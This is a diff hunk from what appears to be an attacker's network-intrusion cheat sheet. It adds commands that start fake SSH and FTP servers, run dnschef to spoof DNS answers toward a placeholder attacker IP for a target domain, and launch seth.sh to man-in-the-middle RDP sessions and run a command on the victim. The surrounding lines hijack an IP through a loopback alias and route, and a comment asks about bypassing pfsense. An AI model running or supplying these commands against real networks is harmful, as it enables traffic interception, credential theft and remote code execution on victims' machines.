@@ -291,10 +291,16 @@ write mem
 ifconfig lo:1 65.x.101.x/25
 ip route add 65.x.101.x/32 via 0.0.0.0 dev lo:1
 
-# mitm dns or ftp or ssh?
+# mitm ssh, ftp, dns?
+./fake_ssh.py
+./fake_ftp.py 
+./dnschef.py --fakeip <BADIP> --fakeipv6 <BADV6IP> -q
+./dnschef.py --fakeip <BADIP> --fakedomains <TARGETDOMAIN> -q
+./dnschef.py --nameservers <VALIDNSIP>,<VALIDNSIP> -q
+
 # use hijacked ip to bypass pfsense?
 # hijack rdp?
-seth.sh <INTERFACE> <ATTACKERIP> <RDPVICTIMIP> <GATEWAYIP> "cmd /c oneliner"
+./seth.sh <INTERFACE> <ATTACKERIP> <RDPVICTIMIP> <GATEWAYIP> "cmd /c oneliner"
 
 # restore traffic locally 
 ifconfig lo:1 127.0.0.2
